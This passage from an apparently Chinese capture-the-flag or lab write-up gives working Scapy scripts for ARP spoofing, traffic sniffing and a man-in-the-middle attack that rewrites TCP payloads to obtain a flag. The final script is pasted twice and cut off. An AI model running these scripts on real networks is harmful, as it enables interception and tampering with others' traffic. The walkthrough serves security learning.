<p>提示我们网络接口配置配置有问题，通过ifconfig命令发现，eth0接口没有配置ipv4地址，手动配置<code>ip addr add 10.0.0.2/24 dev eth0</code>：</p>
<blockquote>
<p>root@ip-10-0-0-2:~# ifconfig eth0: flags&#x3D;4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 inet6 fe80::8c96:7bff:fe9c:4172 prefixlen 64 scopeid 0x20 ether 8e:96:7b:9c:41:72 txqueuelen 1000 (Ethernet) RX packets 49 bytes 3802 (3.7 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 16 bytes 1172 (1.1 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0</p>
<p>lo: flags&#x3D;73&lt;UP,LOOPBACK,RUNNING&gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10 loop txqueuelen 1000 (Local Loopback) RX packets 11 bytes 440 (440.0 B) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 11 bytes 440 (440.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置源和目标信息</span></span><br><span class="line">source_ip = <span class="string">&#x27;10.0.0.2&#x27;</span>  <span class="comment"># 本地IP地址（根据实际情况修改）</span></span><br><span class="line">dest_ip = <span class="string">&#x27;10.0.0.3&#x27;</span>    <span class="comment"># 目标IP地址</span></span><br><span class="line">source_port = <span class="number">31337</span>  <span class="comment"># 源端口</span></span><br><span class="line">dest_port = <span class="number">31337</span>  <span class="comment"># 目标端口</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定要使用的网络接口</span></span><br><span class="line"><span class="comment"># conf.iface = &quot;eth0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 发送SYN包</span></span><br><span class="line">syn = IP(src=source_ip, dst=dest_ip) / TCP(sport=source_port, dport=dest_port, flags=<span class="string">&#x27;S&#x27;</span>, seq=<span class="number">31337</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;Sending SYN packet: <span class="subst">&#123;syn.summary()&#125;</span>&quot;</span>)</span><br><span class="line">syn_ack = sr1(syn, timeout=<span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> syn_ack <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;No SYN-ACK received. The target might be unreachable or blocked by a firewall.&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 尝试捕获收到的所有包</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Sniffing for packets...&quot;</span>)</span><br><span class="line">    sniffed_packets = sniff(iface=<span class="string">&quot;eth0&quot;</span>, count=<span class="number">10</span>, timeout=<span class="number">100</span>)  <span class="comment"># 捕获最多10个包，或等待10秒</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sniffed_packets) &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">for</span> packet <span class="keyword">in</span> sniffed_packets:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Captured a packet:&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(packet.show())  <span class="comment"># 显示每个数据包的详细结构</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;No packets captured.&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;收到SYN-ACK包，序列号: <span class="subst">&#123;syn_ack.seq&#125;</span>, 确认号: <span class="subst">&#123;syn_ack.ack&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 发送ACK包</span></span><br><span class="line">    ack = IP(src=source_ip, dst=dest_ip) / TCP(sport=source_port, dport=dest_port, flags=<span class="string">&#x27;A&#x27;</span>, seq=syn_ack.ack, ack=syn_ack.seq + <span class="number">1</span>)</span><br><span class="line">    send(ack)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;ACK包已发送到 <span class="subst">&#123;dest_ip&#125;</span>:<span class="subst">&#123;dest_port&#125;</span> via <span class="subst">&#123;conf.iface&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-12-Manually-send-an-Address-Resolution-Protocol-packet"><a href="#2-12-Manually-send-an-Address-Resolution-Protocol-packet" class="headerlink" title="2.12 Manually send an Address Resolution Protocol packet"></a>2.12 Manually send an Address Resolution Protocol packet</h3><p>这个也是一样的，要先通过<code>ip addr add 10.0.0.2/24 dev eth0</code>设置网络接口的ipv4地址，然后执行脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义发送方的MAC地址和IP地址</span></span><br><span class="line">sender_mac = <span class="string">&quot;4e:d3:8e:16:1f:7e&quot;</span>  <span class="comment"># 发送方的MAC地址（可以根据实际情况更改）</span></span><br><span class="line">sender_ip = <span class="string">&quot;10.0.0.2&quot;</span>  <span class="comment"># 发送方的IP地址</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义目标主机的IP地址</span></span><br><span class="line">target_ip = <span class="string">&quot;10.0.0.3&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建ARP包</span></span><br><span class="line">arp_packet = ARP(op=<span class="string">&quot;is-at&quot;</span>, hwsrc=sender_mac, psrc=sender_ip, pdst=target_ip)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送ARP包</span></span><br><span class="line">send(arp_packet)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;ARP包已发送到 <span class="subst">&#123;target_ip&#125;</span>，告知其 <span class="subst">&#123;sender_ip&#125;</span> 的MAC地址是 <span class="subst">&#123;sender_mac&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-13-Hijack-traffic-from-a-remote-host-using-ARP"><a href="#2-13-Hijack-traffic-from-a-remote-host-using-ARP" class="headerlink" title="2.13 Hijack traffic from a remote host using ARP"></a>2.13 Hijack traffic from a remote host using ARP</h3><p>一开始我们使用tcpdump -i eth0 监听本机网络接口eth0上是得不到任何数据的。现在执行ARP欺诈：</p>
<p><strong>构造 ARP 响应包</strong>:</p>
<ul>
<li><code>ARP(op=2, ...)</code> 构造了一个 ARP 响应包，其中 <code>op=2</code> 表示这是一个 ARP 回复（即 “is-at”）。</li>
<li><code>pdst=target_ip</code> 设置了目标主机的 IP 地址，即这个 ARP 包将发送到哪个 IP 地址。</li>
<li><code>hwdst=getmacbyip(target_ip)</code> 获取目标主机的 MAC 地址，并将其设置为 ARP 包中的目标硬件地址（即目标 MAC 地址）。</li>
<li><code>psrc=spoof_ip</code> 设置了伪装的 IP 地址，告诉目标主机这个 IP 地址现在与发送者的 MAC 地址相关联。</li>
<li><code>hwsrc=my_mac</code> 设置了发送者的 MAC 地址（攻击者的 MAC 地址），这是你希望目标主机将 <code>spoof_ip</code> 关联的地址。</li>
</ul>
<p><strong>发送 ARP 包</strong>:</p>
<ul>
<li><code>send(arp_response, verbose=False)</code> 发送这个伪造的 ARP 响应包。<code>verbose=False</code> 表示在发送时不输出详细信息。</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标主机信息</span></span><br><span class="line">target1_ip = <span class="string">&quot;10.0.0.4&quot;</span>  <span class="comment"># 远程主机1</span></span><br><span class="line">target2_ip = <span class="string">&quot;10.0.0.2&quot;</span>  <span class="comment"># 远程主机2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 本地主机信息</span></span><br><span class="line">my_mac = <span class="string">&quot;c2:fa:63:2e:21:fb&quot;</span>  <span class="comment"># 替换为你的实际MAC地址</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arp_spoof</span>(<span class="params">target_ip, spoof_ip</span>):</span><br><span class="line">    arp_response = ARP(op=<span class="number">2</span>, pdst=target_ip, hwdst=getmacbyip(target_ip), psrc=spoof_ip, hwsrc=my_mac)</span><br><span class="line">    send(arp_response, verbose=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restore_arp</span>(<span class="params">target_ip, real_mac, spoof_ip</span>):</span><br><span class="line">    arp_response = ARP(op=<span class="number">2</span>, pdst=target_ip, hwdst=real_mac, psrc=spoof_ip, hwsrc=getmacbyip(spoof_ip))</span><br><span class="line">    send(arp_response, count=<span class="number">4</span>, verbose=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] 开始 ARP 欺骗... 按 Ctrl+C 停止.&quot;</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        arp_spoof(target1_ip, target2_ip)</span><br><span class="line">        arp_spoof(target2_ip, target1_ip)</span><br><span class="line">        time.sleep(<span class="number">2</span>)  <span class="comment"># 每2秒发送一次</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] 停止 ARP 欺骗，恢复网络设置...&quot;</span>)</span><br><span class="line">    restore_arp(target1_ip, getmacbyip(target1_ip), target2_ip)</span><br><span class="line">    restore_arp(target2_ip, getmacbyip(target2_ip))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] 完成.&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>之后再次监听eth0会得到：</p>
<blockquote>
<p>oot@ip-10-0-0-3:~# tcpdump -i eth0<br>tcpdump: verbose output suppressed, use -v[v]… for full protocol decode<br>listening on eth0, link-type EN10MB (Ethernet), snapshot length 262144 bytes<br>12:19:48.138491 IP 10.0.0.2.31337 &gt; 10.0.0.4.42118: Flags [S.], seq 1016474819, ack 1875635199, win 65160, options [mss 1460,sackOK,TS val 3852132867 ecr 3986586317,nop,wscale 7], length 0<br>12:19:48.138517 IP 10.0.0.2.31337 &gt; 10.0.0.4.42118: Flags [S.], seq 1016474819, ack 1875635199, win 65160, options [mss 1460,sackOK,TS val 3852132867 ecr 3986586317,nop,wscale 7], length 0<br>12:19:52.302521 IP 10.0.0.2.31337 &gt; 10.0.0.4.421</p>
</blockquote>
<p>最后通过下面的代码获取捕捉到的包的内容</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义目标 IP 地址和端口</span></span><br><span class="line">target_ip = <span class="string">&quot;10.0.0.2&quot;</span></span><br><span class="line">remote_ip = <span class="string">&quot;10.0.0.4&quot;</span></span><br><span class="line">target_port = <span class="number">31337</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义捕获数据包的过滤器</span></span><br><span class="line">filter_str = <span class="string">f&quot;tcp and (host <span class="subst">&#123;target_ip&#125;</span> or host <span class="subst">&#123;remote_ip&#125;</span>) and port <span class="subst">&#123;target_port&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 捕获并处理数据包</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">packet_callback</span>(<span class="params">packet</span>):</span><br><span class="line">    <span class="keyword">if</span> packet.haslayer(TCP):</span><br><span class="line">        tcp_layer = packet[TCP]</span><br><span class="line">        ip_layer = packet[IP]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 收到TCP包，从 <span class="subst">&#123;ip_layer.src&#125;</span>:<span class="subst">&#123;tcp_layer.sport&#125;</span> 到 <span class="subst">&#123;ip_layer.dst&#125;</span>:<span class="subst">&#123;tcp_layer.dport&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> Raw <span class="keyword">in</span> packet:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] 数据内容: <span class="subst">&#123;packet[Raw].load&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用sniff捕获数据包并调用回调函数处理</span></span><br><span class="line">sniff(<span class="built_in">filter</span>=filter_str, iface=<span class="string">&quot;eth0&quot;</span>, prn=packet_callback, store=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="2-14-Man-in-the-middle-traffic-between-two-remote-hosts-and-inject-extra-traffic"><a href="#2-14-Man-in-the-middle-traffic-between-two-remote-hosts-and-inject-extra-traffic" class="headerlink" title="2.14 Man-in-the-middle traffic between two remote hosts and inject extra traffic"></a>2.14 Man-in-the-middle traffic between two remote hosts and inject extra traffic</h3><p>这是一个经典的中间人攻击，我们要使用arp欺诈拦截服务器<code>10.0.0.3</code>与客户端<code>10.0.0.4</code>之间的通信并篡改以获取flag：</p>
<ul>
<li><p>首先通过ifconfig命令获取网络接口eth0的mac地址，之后执行脚本实现arp欺诈：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义目标和受害者的IP地址</span></span><br><span class="line">victim_ip = <span class="string">&quot;10.0.0.4&quot;</span></span><br><span class="line">target_ip = <span class="string">&quot;10.0.0.3&quot;</span></span><br><span class="line">my_mac = <span class="string">&quot;86:a6:ab:d4:f3:c2&quot;</span>  <span class="comment"># 获取当前接口的MAC地址</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">arp_spoof</span>(<span class="params">victim_ip, spoof_ip</span>):</span><br><span class="line">    victim_mac = getmacbyip(victim_ip)</span><br><span class="line">    arp_response = ARP(op=<span class="number">2</span>, pdst=victim_ip, hwdst=victim_mac, psrc=spoof_ip, hwsrc=my_mac)</span><br><span class="line">    send(arp_response, verbose=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定期发送ARP包维持欺骗状态</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">spoof</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            arp_spoof(victim_ip, target_ip)  <span class="comment"># 欺骗victim_ip，使其认为target_ip对应的MAC是我的MAC</span></span><br><span class="line">            arp_spoof(target_ip, victim_ip)  <span class="comment"># 欺骗target_ip，使其认为victim_ip对应的MAC是我的MAC</span></span><br><span class="line">            time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;\n[+] 停止ARP欺骗，恢复网络设置...&quot;</span>)</span><br><span class="line">        <span class="comment"># restore_network()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">restore_network</span>():</span><br><span class="line">    victim_mac = getmacbyip(victim_ip)</span><br><span class="line">    target_mac = getmacbyip(target_ip)</span><br><span class="line">    send(ARP(op=<span class="number">2</span>, pdst=victim_ip, hwdst=victim_mac, psrc=target_ip, hwsrc=target_mac), count=<span class="number">4</span>, verbose=<span class="literal">False</span>)</span><br><span class="line">    send(ARP(op=<span class="number">2</span>, pdst=target_ip, hwdst=target_mac, psrc=victim_ip, hwsrc=victim_mac), count=<span class="number">4</span>, verbose=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">spoof()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>然后我们可以通过下面的脚本查看通信内容</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义目标 IP 地址和端口</span></span><br><span class="line">target_ip = <span class="string">&quot;10.0.0.3s&quot;</span></span><br><span class="line">remote_ip = <span class="string">&quot;10.0.0.4&quot;</span></span><br><span class="line">target_port = <span class="number">31337</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义捕获数据包的过滤器</span></span><br><span class="line">filter_str = <span class="string">f&quot;tcp and (host <span class="subst">&#123;target_ip&#125;</span> or host <span class="subst">&#123;remote_ip&#125;</span>) and port <span class="subst">&#123;target_port&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 捕获并处理数据包</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">packet_callback</span>(<span class="params">packet</span>):</span><br><span class="line">    <span class="keyword">if</span> packet.haslayer(TCP):</span><br><span class="line">        tcp_layer = packet[TCP]</span><br><span class="line">        ip_layer = packet[IP]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 收到TCP包，从 <span class="subst">&#123;ip_layer.src&#125;</span>:<span class="subst">&#123;tcp_layer.sport&#125;</span> 到 <span class="subst">&#123;ip_layer.dst&#125;</span>:<span class="subst">&#123;tcp_layer.dport&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> Raw <span class="keyword">in</span> packet:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] 数据内容: <span class="subst">&#123;packet[Raw].load&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用sniff捕获数据包并调用回调函数处理</span></span><br><span class="line">sniff(<span class="built_in">filter</span>=filter_str, iface=<span class="string">&quot;eth0&quot;</span>, prn=packet_callback, store=<span class="number">0</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>接着使用下面的命令，用来丢弃所有E开头的数据包</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo tc qdisc add dev eth0 root handle 1: prio</span><br><span class="line">sudo tc filter add dev eth0 protocol ip parent 1:0 prio 1 u32 match u8 0x45 0xff at 52 action drop</span><br></pre></td></tr></table></figure>
</li>
<li><p>最后执行下脚本篡改数据包</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于存储已发送修改数据包的信息</span></span><br><span class="line">sent_packets = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">packet_callback</span>(<span class="params">packet</span>):</span><br><span class="line">    <span class="keyword">if</span> packet.haslayer(TCP):</span><br><span class="line">        <span class="comment"># 获取并打印TCP包中的原始数据</span></span><br><span class="line">        <span class="keyword">if</span> Raw <span class="keyword">in</span> packet:</span><br><span class="line">            data = packet[Raw].load</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] TCP包从 <span class="subst">&#123;packet[IP].src&#125;</span>:<span class="subst">&#123;packet[TCP].sport&#125;</span> 到 <span class="subst">&#123;packet[IP].dst&#125;</span>:<span class="subst">&#123;packet[TCP].dport&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 数据: <span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果数据是 &#x27;ECHO\n&#x27;，我们进行修改</span></span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">b&#x27;ECHO\n&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] 检测到 ECHO 命令，准备将其修改为 FLAG&quot;</span>)</span><br><span class="line">            <span class="comment"># 修改 ECHO 为 FLAG</span></span><br><span class="line">            modified_data = <span class="string">b&#x27;FLAG\n&#x27;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] 修改后的数据内容: <span class="subst">&#123;modified_data&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 构建修改后的数据包，继承原始的序列号、确认号等信息</span></span><br><span class="line">            original_flags = packet[TCP].flags</span><br><span class="line">            new_packet = IP(src=packet[IP].src, dst=packet[IP].dst) / \</span><br><span class="line">                         TCP(sport=packet[TCP].sport, dport=packet[TCP].dport, seq=packet[TCP].seq, ack=packet[TCP].ack, flags=original_flags) / \</span><br><span class="line">                         modified_data</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 重置校验和，确保重新计算</span></span><br><span class="line">            new_packet[IP].chksum = <span class="literal">None</span></span><br><span class="line">            new_packet[TCP].chksum = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">            <span class="comment"># 发送修改后的数据包</span></span><br><span class="line">            send(new_packet)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] 修改后的数据包已发送&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 这里可以选择丢弃原来的数据包，阻止原包继续发送</span></span><br><span class="line">            <span class="keyword">return</span>  <span class="comment"># 拦截原数据包，不再发送原始的 ECHO 包</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 捕获并处理TCP流量</span></span><br><span class="line">sniff(iface=<span class="string">&quot;eth0&quot;</span>, prn=packet_callback, <span class="built_in">filter</span>=<span class="string">&quot;tcp&quot;</span>, store=<span class="number">0</span>)</span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于存储已发送修改数据包的信息</span></span><br><span class="line">sent_packets = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">packet_callback</span>(<span class="params">packet</span>):</span><br><span class="line">    <span class="keyword">if</span> packet.haslayer(TCP):</span><br><span class="line">        <span class="comment"># 获取并打印TCP包中的原始数据</span></span><br><span class="line">        <span class="keyword">if</span> Raw <span class="keyword">in</span> packet:</span><br><span class="line">            data = packet[Raw].load</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] TCP包从 <span class="subst">&#123;packet[IP].src&#125;</span>:<span class="subst">&#123;packet[TCP].sport&#125;</span> 到 <span class="subst">&#123;packet[IP].dst&#125;</span>:<span class="subst">&#123;packet[TCP].dport&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[*] 数据: <span class="subst">&#123;data&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果数据是 &#x27;ECHO\n&#x27;，我们进行修改</span></span><br><span class="line">        <span class="keyword">if</span> data == <span class="string">b&#x27;ECHO\n&#x27;</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[*] 检测到 ECHO 命令，准备将其修改为 FLAG&quot;</span>)</span><br><span class="line">            <span class="comment"># 修改 ECHO 为 FLAG</span></span><br><span class="line">            modified_data = <span class="string">b&#x27;FLAG\n&#x27;</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] 修改后的数据内容: <span class="subst">&#123;modified_data&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 构建修改后的数据包，继承原始的序列号、确认号等信息</span></span><br><span class="line">            original_flags = packet[TCP].flags</span><br><span class="line">            new_packet = IP(src=packet[IP].src, dst=packet[IP].dst) / \</span><br><span class="line">                         TCP(sport=packet[TCP].sport, dport=packet[TCP].dport, seq=packet[TCP].seq, ack=packet[TCP].ack, flags=original_flags) / \</span><br><span class="line">                         modified_data</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 重置校验和，确保重新计算</span></span><br><span class="line">            